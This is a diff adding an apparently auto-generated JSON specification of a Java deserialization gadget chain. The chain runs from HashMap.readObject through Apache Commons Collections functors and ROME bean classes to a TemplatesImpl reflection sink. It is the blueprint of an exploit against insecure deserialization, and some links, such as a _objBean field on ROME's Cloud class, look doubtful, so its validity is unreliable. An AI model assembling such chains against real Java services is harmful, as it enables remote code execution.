@@ -1,0 +1,99 @@
+{
+  "chain_type": "transform_chain",
+  "root_class": "java.util.HashMap",
+  "root_trigger": "readObject→hash→hashCode→get→transform→evaluate→transform→execute→execute→equals→equals→toString→getOutputProperties→reflection",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.keyvalue.TiedMapEntry",
+      "field_overrides": {
+        "map": {
+          "$ref": "link:1"
+        },
+        "key": "trigger"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.map.LazyMap",
+      "field_overrides": {
+        "map": [],
+        "factory": {
+          "$ref": "link:2"
+        }
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.PredicateTransformer",
+      "field_overrides": {
+        "iPredicate": {
+          "$ref": "link:3"
+        }
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.TransformerPredicate",
+      "field_overrides": {
+        "iTransformer": {
+          "$ref": "link:4"
+        }
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.ClosureTransformer",
+      "field_overrides": {
+        "iClosure": {
+          "$ref": "link:5"
+        }
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.WhileClosure",
+      "field_overrides": {
+        "iPredicate": {
+          "$ref": "link:6"
+        }
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.EqualPredicate",
+      "field_overrides": {
+        "iValue": {
+          "$ref": "link:7"
+        }
+      }
+    },
+    {
+      "class": "com.sun.syndication.feed.rss.Cloud",
+      "field_overrides": {
+        "_objBean": {
+          "$ref": "link:8"
+        }
+      }
+    },
+    {
+      "class": "com.sun.syndication.feed.impl.ObjectBean",
+      "field_overrides": {
+        "_equalsBean": {
+          "$ref": "link:0"
+        },
+        "_toStringBean": {
+          "$ref": "link:9"
+        }
+      }
+    },
+    {
+      "class": "com.sun.syndication.feed.impl.ToStringBean",
+      "field_overrides": {
+        "_beanClass": "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+        "_obj": {
+          "$ref": "link:1"
+        }
+      }
+    }
+  ],
+  "sink_method": "reflection",
+  "_iocd_meta": {
+    "auto_generated": true,
+    "chain_depth": 10,
+    "sink_category": "reflection"
+  }
+}
